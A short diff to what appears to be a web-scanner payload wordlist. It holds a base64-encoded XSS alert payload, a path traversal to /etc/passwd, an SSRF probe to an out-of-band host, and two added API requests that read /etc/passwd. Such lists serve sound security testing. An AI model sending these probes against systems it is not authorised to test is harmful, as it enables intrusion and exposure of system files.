@@ -10,3 +10,6 @@
 /base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
 /static/css//../../../../../../../../etc/passwd
 /render.html?url=https://oast.live
+
+/api/system/fileView?file=/etc/passwd
+/api/system/fileDownload?file=/etc/passwd
